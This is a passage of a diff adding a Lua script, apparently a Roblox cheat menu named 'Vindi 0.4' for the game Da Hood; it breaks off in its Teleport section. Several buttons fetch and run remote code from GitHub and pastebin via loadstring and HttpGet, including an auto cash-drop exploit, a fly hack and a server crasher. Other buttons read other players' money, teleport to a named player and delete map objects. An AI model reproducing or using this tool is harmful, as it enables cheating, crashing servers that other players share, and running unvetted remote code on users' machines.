@@ -1,0 +1,786 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local _04 = Instance.new("ScreenGui")
+local DragMain = Instance.new("Frame")
+local UICorner = Instance.new("UICorner")
+local ColorUp = Instance.new("Frame")
+local UICorner_2 = Instance.new("UICorner")
+local Title = Instance.new("TextLabel")
+local UICorner_3 = Instance.new("UICorner")
+local UIGradient = Instance.new("UIGradient")
+local LogoIMage = Instance.new("ImageLabel")
+local Middleside = Instance.new("Frame")
+local UICorner_4 = Instance.new("UICorner")
+local UIGradient_2 = Instance.new("UIGradient")
+local NameBox = Instance.new("TextBox")
+local UICorner_5 = Instance.new("UICorner")
+local MoneyBox = Instance.new("TextLabel")
+local UICorner_6 = Instance.new("UICorner")
+local CheckMoney = Instance.new("TextButton")
+local UICorner_7 = Instance.new("UICorner")
+local TeleportPlayerButton = Instance.new("TextButton")
+local UICorner_8 = Instance.new("UICorner")
+local Upperside = Instance.new("Frame")
+local UICorner_9 = Instance.new("UICorner")
+local UIGradient_3 = Instance.new("UIGradient")
+local DropMoney = Instance.new("Frame")
+local UICorner_10 = Instance.new("UICorner")
+local UIGradient_4 = Instance.new("UIGradient")
+local DropMoneyTitle = Instance.new("TextLabel")
+local DropMoneyButton = Instance.new("TextButton")
+local UICorner_11 = Instance.new("UICorner")
+local AntiAFK = Instance.new("Frame")
+local UICorner_12 = Instance.new("UICorner")
+local UIGradient_5 = Instance.new("UIGradient")
+local AntiAFKTitle = Instance.new("TextLabel")
+local AntiAFKButton = Instance.new("TextButton")
+local UICorner_13 = Instance.new("UICorner")
+local CrashServer = Instance.new("Frame")
+local UICorner_14 = Instance.new("UICorner")
+local UIGradient_6 = Instance.new("UIGradient")
+local CrashServerTitle = Instance.new("TextLabel")
+local CrashServerButton = Instance.new("TextButton")
+local UICorner_15 = Instance.new("UICorner")
+local RemoveBuilding = Instance.new("Frame")
+local UICorner_16 = Instance.new("UICorner")
+local UIGradient_7 = Instance.new("UIGradient")
+local RemoveBuildingTitle = Instance.new("TextLabel")
+local RemoveBuildingButton = Instance.new("TextButton")
+local UICorner_17 = Instance.new("UICorner")
+local Aimlock = Instance.new("Frame")
+local UICorner_18 = Instance.new("UICorner")
+local UIGradient_8 = Instance.new("UIGradient")
+local AimlockTitle = Instance.new("TextLabel")
+local AimlockButton = Instance.new("TextButton")
+local UICorner_19 = Instance.new("UICorner")
+local lockside = Instance.new("Frame")
+local UICorner_20 = Instance.new("UICorner")
+local UIGradient_9 = Instance.new("UIGradient")
+local lockchartitle = Instance.new("TextLabel")
+local LockCharON = Instance.new("TextButton")
+local UICorner_21 = Instance.new("UICorner")
+local UIGradient_10 = Instance.new("UIGradient")
+local LockCharOFF = Instance.new("TextButton")
+local UICorner_22 = Instance.new("UICorner")
+local UIGradient_11 = Instance.new("UIGradient")
+local Moneyside = Instance.new("Frame")
+local UICorner_23 = Instance.new("UICorner")
+local UIGradient_12 = Instance.new("UIGradient")
+local MoneyTitle = Instance.new("TextLabel")
+local MoneyHide = Instance.new("Frame")
+local UICorner_24 = Instance.new("UICorner")
+local UIGradient_13 = Instance.new("UIGradient")
+local MoneyHideTitle = Instance.new("TextLabel")
+local MoneyHideButton = Instance.new("TextButton")
+local UICorner_25 = Instance.new("UICorner")
+local Teleport = Instance.new("Frame")
+local UICorner_26 = Instance.new("UICorner")
+local UIGradient_14 = Instance.new("UIGradient")
+local TeleportTitle = Instance.new("TextLabel")
+local Bank = Instance.new("TextButton")
+local UICorner_27 = Instance.new("UICorner")
+local School = Instance.new("TextButton")
+local UICorner_28 = Instance.new("UICorner")
+local Basketball = Instance.new("TextButton")
+local UICorner_29 = Instance.new("UICorner")
+local AdminBase = Instance.new("TextButton")
+local UICorner_30 = Instance.new("UICorner")
+local Club = Instance.new("TextButton")
+local UICorner_31 = Instance.new("UICorner")
+local Train = Instance.new("TextButton")
+local UICorner_32 = Instance.new("UICorner")
+local TextLabel = Instance.new("TextLabel")
+
+--Properties:
+
+_04.Name = "0.4"
+_04.Parent = game.CoreGui
+_04.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+DragMain.Name = "DragMain"
+DragMain.Parent = _04
+DragMain.BackgroundColor3 = Color3.fromRGB(11, 11, 11)
+DragMain.Position = UDim2.new(0.178983852, 0, 0.122480616, 0)
+DragMain.Size = UDim2.new(0, 216, 0, 486)
+DragMain.Active = true
+DragMain.Draggable = true
+
+UICorner.Parent = DragMain
+
+ColorUp.Name = "ColorUp"
+ColorUp.Parent = DragMain
+ColorUp.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ColorUp.Size = UDim2.new(0, 216, 0, 7)
+
+UICorner_2.Parent = ColorUp
+
+Title.Name = "Title"
+Title.Parent = DragMain
+Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Title.BorderColor3 = Color3.fromRGB(27, 42, 53)
+Title.Position = UDim2.new(0.0370370373, 0, 0.0329218097, 0)
+Title.Size = UDim2.new(0, 200, 0, 27)
+Title.Font = Enum.Font.SourceSans
+Title.Text = "Vindi 0.4"
+Title.TextColor3 = Color3.fromRGB(0, 0, 0)
+Title.TextSize = 25.000
+Title.TextWrapped = true
+
+UICorner_3.Parent = Title
+
+UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 0, 0)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(184, 0, 0))}
+UIGradient.Rotation = 90
+UIGradient.Parent = Title
+
+LogoIMage.Name = "LogoIMage"
+LogoIMage.Parent = DragMain
+LogoIMage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+LogoIMage.BackgroundTransparency = 1.000
+LogoIMage.Position = UDim2.new(0.685185194, 0, 0.901234567, 0)
+LogoIMage.Size = UDim2.new(0, 86, 0, 64)
+LogoIMage.Image = "rbxassetid://8216063920"
+
+Middleside.Name = "Middleside"
+Middleside.Parent = DragMain
+Middleside.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Middleside.Position = UDim2.new(0.0370370373, 0, 0.386831284, 0)
+Middleside.Size = UDim2.new(0, 200, 0, 52)
+
+UICorner_4.Parent = Middleside
+
+UIGradient_2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 0, 0)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(175, 0, 0))}
+UIGradient_2.Rotation = 90
+UIGradient_2.Parent = Middleside
+
+NameBox.Name = "NameBox"
+NameBox.Parent = Middleside
+NameBox.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
+NameBox.Position = UDim2.new(0.0250000004, 0, 0.100643486, 0)
+NameBox.Size = UDim2.new(0, 190, 0, 18)
+NameBox.Font = Enum.Font.SourceSans
+NameBox.PlaceholderText = "Enter Username"
+NameBox.Text = ""
+NameBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+NameBox.TextSize = 14.000
+
+UICorner_5.Parent = NameBox
+
+MoneyBox.Name = "MoneyBox"
+MoneyBox.Parent = Middleside
+MoneyBox.BackgroundColor3 = Color3.fromRGB(11, 11, 11)
+MoneyBox.Position = UDim2.new(0.0199999996, 0, 0.550000012, 0)
+MoneyBox.Size = UDim2.new(0, 91, 0, 18)
+MoneyBox.Font = Enum.Font.SourceSans
+MoneyBox.Text = "Player Money"
+MoneyBox.TextColor3 = Color3.fromRGB(4, 255, 0)
+MoneyBox.TextSize = 14.000
+
+UICorner_6.Parent = MoneyBox
+
+CheckMoney.Name = "CheckMoney"
+CheckMoney.Parent = Middleside
+CheckMoney.BackgroundColor3 = Color3.fromRGB(11, 11, 11)
+CheckMoney.Position = UDim2.new(0.49000001, 0, 0.550000012, 0)
+CheckMoney.Size = UDim2.new(0, 55, 0, 18)
+CheckMoney.Font = Enum.Font.SourceSans
+CheckMoney.Text = "Check"
+CheckMoney.TextColor3 = Color3.fromRGB(255, 255, 255)
+CheckMoney.TextSize = 14.000
+CheckMoney.MouseButton1Click:Connect(function()
+	MoneyBox.Text = game.Players:WaitForChild(NameBox.Text).DataFolder.Currency.Value
+end)
+
+UICorner_7.Parent = CheckMoney
+
+TeleportPlayerButton.Name = "TeleportPlayerButton"
+TeleportPlayerButton.Parent = Middleside
+TeleportPlayerButton.BackgroundColor3 = Color3.fromRGB(11, 11, 11)
+TeleportPlayerButton.Position = UDim2.new(0.779999971, 0, 0.550000012, 0)
+TeleportPlayerButton.Size = UDim2.new(0, 39, 0, 18)
+TeleportPlayerButton.Font = Enum.Font.SourceSans
+TeleportPlayerButton.Text = "Go to"
+TeleportPlayerButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+TeleportPlayerButton.TextSize = 14.000
+TeleportPlayerButton.MouseButton1Click:Connect(function()
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players:WaitForChild(NameBox.Text).Character.HumanoidRootPart.CFrame
+end)
+
+UICorner_8.Parent = TeleportPlayerButton
+
+Upperside.Name = "Upperside"
+Upperside.Parent = DragMain
+Upperside.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Upperside.Position = UDim2.new(0.0370370373, 0, 0.104938269, 0)
+Upperside.Size = UDim2.new(0, 200, 0, 128)
+
+UICorner_9.Parent = Upperside
+
+UIGradient_3.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 0, 0)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(175, 0, 0))}
+UIGradient_3.Rotation = 90
+UIGradient_3.Parent = Upperside
+
+DropMoney.Name = "DropMoney"
+DropMoney.Parent = Upperside
+DropMoney.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+DropMoney.Position = UDim2.new(0.0250000004, 0, 0.0405745506, 0)
+DropMoney.Size = UDim2.new(0, 190, 0, 21)
+
+UICorner_10.Parent = DropMoney
+
+UIGradient_4.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(0, 0, 0)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(24, 24, 24))}
+UIGradient_4.Parent = DropMoney
+
+DropMoneyTitle.Name = "DropMoneyTitle"
+DropMoneyTitle.Parent = DropMoney
+DropMoneyTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+DropMoneyTitle.BackgroundTransparency = 1.000
+DropMoneyTitle.Position = UDim2.new(0.0315789357, 0, -0.142857149, 0)
+DropMoneyTitle.Size = UDim2.new(0, 90, 0, 27)
+DropMoneyTitle.Font = Enum.Font.SourceSans
+DropMoneyTitle.Text = "Insert Drop Money"
+DropMoneyTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+DropMoneyTitle.TextSize = 14.000
+
+DropMoneyButton.Name = "DropMoneyButton"
+DropMoneyButton.Parent = DropMoney
+DropMoneyButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+DropMoneyButton.Position = UDim2.new(0.710526288, 0, 0.222494215, 0)
+DropMoneyButton.Size = UDim2.new(0, 48, 0, 10)
+DropMoneyButton.Font = Enum.Font.SourceSans
+DropMoneyButton.Text = ""
+DropMoneyButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+DropMoneyButton.TextSize = 14.000
+DropMoneyButton.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet(("https://raw.githubusercontent.com/Raycodex/Exploiting/main/Roblox/Da%20Hood%20Auto%20Cash%20Drop"), true))()
+end)
+
+UICorner_11.Parent = DropMoneyButton
+
+AntiAFK.Name = "AntiAFK"
+AntiAFK.Parent = Upperside
+AntiAFK.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+AntiAFK.Position = UDim2.new(0.0250000004, 0, 0.220437497, 0)
+AntiAFK.Size = UDim2.new(0, 190, 0, 21)
+
+UICorner_12.Parent = AntiAFK
+
+UIGradient_5.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(0, 0, 0)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(24, 24, 24))}
+UIGradient_5.Parent = AntiAFK
+
+AntiAFKTitle.Name = "AntiAFKTitle"
+AntiAFKTitle.Parent = AntiAFK
+AntiAFKTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+AntiAFKTitle.BackgroundTransparency = 1.000
+AntiAFKTitle.Position = UDim2.new(-1.11758709e-08, 0, -0.190476194, 0)
+AntiAFKTitle.Size = UDim2.new(0, 90, 0, 27)
+AntiAFKTitle.Font = Enum.Font.SourceSans
+AntiAFKTitle.Text = "Enable AntiAFK"
+AntiAFKTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+AntiAFKTitle.TextSize = 14.000
+
+AntiAFKButton.Name = "AntiAFKButton"
+AntiAFKButton.Parent = AntiAFK
+AntiAFKButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+AntiAFKButton.Position = UDim2.new(0.711000025, 0, 0.247999996, 0)
+AntiAFKButton.Size = UDim2.new(0, 48, 0, 10)
+AntiAFKButton.Font = Enum.Font.SourceSans
+AntiAFKButton.Text = ""
+AntiAFKButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+AntiAFKButton.TextSize = 14.000
+AntiAFKButton.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet(("https://pastebin.com/raw/9QCyuc2p"), true))()
+end)
+
+UICorner_13.Parent = AntiAFKButton
+
+CrashServer.Name = "CrashServer"
+CrashServer.Parent = Upperside
+CrashServer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+CrashServer.Position = UDim2.new(0.0250000004, 0, 0.402437508, 0)
+CrashServer.Size = UDim2.new(0, 190, 0, 21)
+
+UICorner_14.Parent = CrashServer
+
+UIGradient_6.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(0, 0, 0)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(24, 24, 24))}
+UIGradient_6.Parent = CrashServer
+
+CrashServerTitle.Name = "CrashServerTitle"
+CrashServerTitle.Parent = CrashServer
+CrashServerTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+CrashServerTitle.BackgroundTransparency = 1.000
+CrashServerTitle.Position = UDim2.new(0.0315789357, 0, -0.142857149, 0)
+CrashServerTitle.Size = UDim2.new(0, 90, 0, 27)
+CrashServerTitle.Font = Enum.Font.SourceSans
+CrashServerTitle.Text = "Insert Crash Server"
+CrashServerTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+CrashServerTitle.TextSize = 14.000
+
+CrashServerButton.Name = "CrashServerButton"
+CrashServerButton.Parent = CrashServer
+CrashServerButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+CrashServerButton.Position = UDim2.new(0.711000025, 0, 0.247999996, 0)
+CrashServerButton.Size = UDim2.new(0, 48, 0, 10)
+CrashServerButton.Font = Enum.Font.SourceSans
+CrashServerButton.Text = ""
+CrashServerButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+CrashServerButton.TextSize = 14.000
+CrashServerButton.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
+end)
+
+UICorner_15.Parent = CrashServerButton
+
+RemoveBuilding.Name = "RemoveBuilding"
+RemoveBuilding.Parent = Upperside
+RemoveBuilding.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+RemoveBuilding.Position = UDim2.new(0.0250000004, 0, 0.592437506, 0)
+RemoveBuilding.Size = UDim2.new(0, 190, 0, 21)
+
+UICorner_16.Parent = RemoveBuilding
+
+UIGradient_7.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(0, 0, 0)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(24, 24, 24))}
+UIGradient_7.Parent = RemoveBuilding
+
+RemoveBuildingTitle.Name = "RemoveBuildingTitle"
+RemoveBuildingTitle.Parent = RemoveBuilding
+RemoveBuildingTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+RemoveBuildingTitle.BackgroundTransparency = 1.000
+RemoveBuildingTitle.Position = UDim2.new(0.0789473504, 0, -0.142857149, 0)
+RemoveBuildingTitle.Size = UDim2.new(0, 90, 0, 27)
+RemoveBuildingTitle.Font = Enum.Font.SourceSans
+RemoveBuildingTitle.Text = "Remove Building (FPS)"
+RemoveBuildingTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+RemoveBuildingTitle.TextSize = 14.000
+
+RemoveBuildingButton.Name = "RemoveBuildingButton"
+RemoveBuildingButton.Parent = RemoveBuilding
+RemoveBuildingButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+RemoveBuildingButton.Position = UDim2.new(0.711000025, 0, 0.247999996, 0)
+RemoveBuildingButton.Size = UDim2.new(0, 48, 0, 10)
+RemoveBuildingButton.Font = Enum.Font.SourceSans
+RemoveBuildingButton.Text = ""
+RemoveBuildingButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+RemoveBuildingButton.TextSize = 14.000
+RemoveBuildingButton.MouseButton1Click:Connect(function()
+	game.Workspace.MAP.Map:WaitForChild("Game-Houses"):Destroy()
+	game.Workspace.MAP:WaitForChild("CarnivalPlace"):Destroy()
+	game.Workspace:WaitForChild("Lights"):Destroy()
+	game.Workspace.Ignored:WaitForChild("HouseOwn"):Destroy()
+	game.Workspace.Ignored:WaitForChild("HouseOwn"):Destroy()
+	game.Workspace.Ignored:WaitForChild("HouseOwn"):Destroy()
+	game.Workspace.Ignored:WaitForChild("HouseOwn"):Destroy()
+	game.Workspace.Ignored:WaitForChild("HouseOwn"):Destroy()
+	game.Workspace.Ignored:WaitForChild("HouseOwn"):Destroy()
+	game.Workspace.Ignored:WaitForChild("HouseOwn"):Destroy()
+	game.Workspace.Ignored:WaitForChild("HouseOwn"):Destroy()
+	game.Workspace.Ignored:WaitForChild("HouseOwn"):Destroy()
+	game.Workspace.Ignored:WaitForChild("HouseOwn"):Destroy()
+	game.Workspace.Ignored:WaitForChild("HouseOwn"):Destroy()
+	game.Workspace.Ignored:WaitForChild("HouseOwn"):Destroy()
+	game.Workspace.Ignored:WaitForChild("HouseOwn"):Destroy()
+	game.Workspace.Ignored:WaitForChild("HouseOwn"):Destroy()
+	game.Workspace.Ignored:WaitForChild("HouseOwn"):Destroy()
+	local Workspace = game:GetService('Workspace')
+	for Index, slumone in ipairs(Workspace:GetDescendants()) do
+		if slumone.Name == 'slum house 1' then
+			slumone:Destroy()
+		end
+	end
+	for Index, slumtwo in ipairs(Workspace:GetDescendants()) do
+		if slumtwo.Name == 'slum house 2' then
+			slumtwo:Destroy()
+		end
+	end
+	for Index, slumtee in ipairs(Workspace:GetDescendants()) do
+		if slumtee.Name == 'slum house 3' then
+			slumtee:Destroy()
+		end
+	end
+	for Index, slumfor in ipairs(Workspace:GetDescendants()) do
+		if slumfor.Name == 'slum house 4' then
+			slumfor:Destroy()
+		end
+	end
+	for Index, slumfif in ipairs(Workspace:GetDescendants()) do
+		if slumfif.Name == 'slum house 5' then
+			slumfif:Destroy()
+		end
+	end
+	for Index, slumsix in ipairs(Workspace:GetDescendants()) do
+		if slumsix.Name == 'slum house 6' then
+			slumsix:Destroy()
+		end
+	end
+	for Index, slumseven in ipairs(Workspace:GetDescendants()) do
+		if slumseven.Name == 'slum house 7' then
+			slumseven:Destroy()
+		end
+	end
+	
+	local decalsyeeted = true -- Leaving this on makes games look shitty but the fps goes up by at least 20.
+	local g = game
+	local w = g.Workspace
+	local l = g.Lighting
+	local t = w.Terrain
+	t.WaterWaveSize = 0
+	t.WaterWaveSpeed = 0
+	t.WaterReflectance = 0
+	t.WaterTransparency = 0
+	l.GlobalShadows = false
+	l.FogEnd = 9e9
+	l.Brightness = 0
+	settings().Rendering.QualityLevel = "Level01"
+	for i, v in pairs(g:GetDescendants()) do
+		if v:IsA("Part") or v:IsA("Union") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
+			v.Material = "Plastic"
+			v.Reflectance = 0
+		elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
+			v.Transparency = 1
+		elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
+			v.Lifetime = NumberRange.new(0)
+		elseif v:IsA("Explosion") then
+			v.BlastPressure = 1
+			v.BlastRadius = 1
+		elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") then
+			v.Enabled = false
+		elseif v:IsA("MeshPart") then
+			v.Material = "Plastic"
+			v.Reflectance = 0
+			v.TextureID = 10385902758728957
+		end
+	end
+	for i, e in pairs(l:GetChildren()) do
+		if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
+			e.Enabled = false
+		end
+	end
+end)
+
+UICorner_17.Parent = RemoveBuildingButton
+
+Aimlock.Name = "Aimlock"
+Aimlock.Parent = Upperside
+Aimlock.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Aimlock.Position = UDim2.new(0.0250000004, 0, 0.78343749, 0)
+Aimlock.Size = UDim2.new(0, 190, 0, 21)
+
+UICorner_18.Parent = Aimlock
+
+UIGradient_8.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(0, 0, 0)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(24, 24, 24))}
+UIGradient_8.Parent = Aimlock
+
+AimlockTitle.Name = "AimlockTitle"
+AimlockTitle.Parent = Aimlock
+AimlockTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+AimlockTitle.BackgroundTransparency = 1.000
+AimlockTitle.Position = UDim2.new(-0.068, 0,-0.143, 0)
+AimlockTitle.Size = UDim2.new(0, 90, 0, 27)
+AimlockTitle.Font = Enum.Font.SourceSans
+AimlockTitle.Text = "Shazam Fly"
+AimlockTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+AimlockTitle.TextSize = 14.000
+
+AimlockButton.Name = "AimlockButton"
+AimlockButton.Parent = Aimlock
+AimlockButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+AimlockButton.Position = UDim2.new(0.711000025, 0, 0.247999996, 0)
+AimlockButton.Size = UDim2.new(0, 48, 0, 10)
+AimlockButton.Font = Enum.Font.SourceSans
+AimlockButton.Text = ""
+AimlockButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+AimlockButton.TextSize = 14.000
+AimlockButton.MouseButton1Click:Connect(function()
+	-- Da Hood Shazam Fly made by Raycodex#9595
+
+	--// Settings
+	_G.ShazamFlySpeed = 3
+
+	--// Script
+	loadstring(game:HttpGet(("https://raw.githubusercontent.com/Raycodex/Exploiting/main/Roblox/DaHoodShazamFly"), true))()
+end)
+
+UICorner_19.Parent = AimlockButton
+
+lockside.Name = "lockside"
+lockside.Parent = DragMain
+lockside.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+lockside.Position = UDim2.new(0.0370370373, 0, 0.888888896, 0)
+lockside.Size = UDim2.new(0, 200, 0, 21)
+
+UICorner_20.Parent = lockside
+
+UIGradient_9.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(42, 42, 42)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(31, 30, 30))}
+UIGradient_9.Rotation = 90
+UIGradient_9.Parent = lockside
+
+lockchartitle.Name = "lockchartitle"
+lockchartitle.Parent = lockside
+lockchartitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+lockchartitle.BackgroundTransparency = 1.000
+lockchartitle.Position = UDim2.new(0.0250000004, 0, 0, 0)
+lockchartitle.Size = UDim2.new(0, 80, 0, 19)
+lockchartitle.Font = Enum.Font.SourceSans
+lockchartitle.Text = "Lock Character"
+lockchartitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+lockchartitle.TextSize = 14.000
+
+LockCharON.Name = "LockCharON"
+LockCharON.Parent = lockside
+LockCharON.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+LockCharON.Position = UDim2.new(0.49000001, 0, 0.190476194, 0)
+LockCharON.Size = UDim2.new(0, 42, 0, 13)
+LockCharON.Font = Enum.Font.SourceSans
+LockCharON.Text = "ON"
+LockCharON.TextColor3 = Color3.fromRGB(0, 0, 0)
+LockCharON.TextSize = 14.000
+LockCharON.MouseButton1Click:Connect(function()
+	game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
+end)
+
+UICorner_21.Parent = LockCharON
+
+UIGradient_10.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 0, 0)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(173, 0, 0))}
+UIGradient_10.Parent = LockCharON
+
+LockCharOFF.Name = "LockCharOFF"
+LockCharOFF.Parent = lockside
+LockCharOFF.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+LockCharOFF.Position = UDim2.new(0.764130414, 0, 0.190476194, 0)
+LockCharOFF.Size = UDim2.new(0, 42, 0, 13)
+LockCharOFF.Font = Enum.Font.SourceSans
+LockCharOFF.Text = "OFF"
+LockCharOFF.TextColor3 = Color3.fromRGB(0, 0, 0)
+LockCharOFF.TextSize = 14.000
+LockCharOFF.MouseButton1Click:Connect(function()
+	game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
+end)
+
+UICorner_22.Parent = LockCharOFF
+
+UIGradient_11.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 0, 0)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(173, 0, 0))}
+UIGradient_11.Parent = LockCharOFF
+
+Moneyside.Name = "Moneyside"
+Moneyside.Parent = DragMain
+Moneyside.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Moneyside.Position = UDim2.new(0.0370370373, 0, 0.512345672, 0)
+Moneyside.Size = UDim2.new(0, 200, 0, 48)
+
+UICorner_23.Parent = Moneyside
+
+UIGradient_12.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 0, 0)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(175, 0, 0))}
+UIGradient_12.Rotation = 90
+UIGradient_12.Parent = Moneyside
+
+MoneyTitle.Name = "MoneyTitle"
+MoneyTitle.Parent = Moneyside
+MoneyTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+MoneyTitle.BackgroundTransparency = 1.000
+MoneyTitle.Position = UDim2.new(0.284999996, 0, 0, 0)
+MoneyTitle.Size = UDim2.new(0, 85, 0, 20)
+MoneyTitle.Font = Enum.Font.SourceSans
+MoneyTitle.Text = "Money"
+MoneyTitle.TextColor3 = Color3.fromRGB(0, 0, 0)
+MoneyTitle.TextSize = 14.000
+
+MoneyHide.Name = "MoneyHide"
+MoneyHide.Parent = Moneyside
+MoneyHide.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+MoneyHide.Position = UDim2.new(0.0250000004, 0, 0.40843749, 0)
+MoneyHide.Size = UDim2.new(0, 190, 0, 21)
+
+UICorner_24.Parent = MoneyHide
+
+UIGradient_13.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(0, 0, 0)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(24, 24, 24))}
+UIGradient_13.Parent = MoneyHide
+
+MoneyHideTitle.Name = "MoneyHideTitle"
+MoneyHideTitle.Parent = MoneyHide
+MoneyHideTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+MoneyHideTitle.BackgroundTransparency = 1.000
+MoneyHideTitle.Position = UDim2.new(0, 0, -0.142857149, 0)
+MoneyHideTitle.Size = UDim2.new(0, 71, 0, 27)
+MoneyHideTitle.Font = Enum.Font.SourceSans
+MoneyHideTitle.Text = "Hide Money"
+MoneyHideTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+MoneyHideTitle.TextSize = 14.000
+
+MoneyHideButton.Name = "MoneyHideButton"
+MoneyHideButton.Parent = MoneyHide
+MoneyHideButton.BackgroundColor3 = Color3.fromRGB(4, 255, 0)
+MoneyHideButton.Position = UDim2.new(0.711000025, 0, 0.247999996, 0)
+MoneyHideButton.Size = UDim2.new(0, 48, 0, 10)
+MoneyHideButton.Font = Enum.Font.SourceSans
+MoneyHideButton.Text = ""
+MoneyHideButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+MoneyHideButton.TextSize = 14.000
+MoneyHideButton.MouseButton1Click:Connect(function()
+	while true do
+		wait(0.1)
+		if MoneyHideButton.BackgroundColor3 == Color3.fromRGB(255, 0, 0) then
+			local instances = game.Workspace.Ignored:WaitForChild("Drop"):GetChildren();
+			for _, v in ipairs(instances) do
+				if (v.Name) == "MoneyDrop" then
+					v.Transparency = 1
+					v.Decal.Transparency = 1
+					v.Decal.Transparency = 1
+				end
+			end
+		elseif MoneyHideButton.BackgroundColor3 == Color3.fromRGB(4, 255, 0) then
+			local instances = game.Workspace.Ignored:WaitForChild("Drop"):GetChildren();
+			for _, v in ipairs(instances) do
+				if (v.Name) == "MoneyDrop" then
+					v.Transparency = 0
+				end
+			end
+		end
+	end
+end)
+
+MoneyHideButton.MouseButton1Click:Connect(function()
+	if MoneyHideButton.BackgroundColor3 == Color3.fromRGB(4, 255, 0) then
+		MoneyHideButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+	elseif MoneyHideButton.BackgroundColor3 == Color3.fromRGB(255, 0, 0) then
+		MoneyHideButton.BackgroundColor3 = Color3.fromRGB(4, 255, 0)
+	end
+end)
+
+UICorner_25.Parent = MoneyHideButton
+
+Teleport.Name = "Teleport"
+Teleport.Parent = DragMain
+Teleport.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Teleport.Position = UDim2.new(0.0370370373, 0, 0.629629612, 0)
+Teleport.Size = UDim2.new(0, 200, 0, 119)
+
+UICorner_26.Parent = Teleport
+
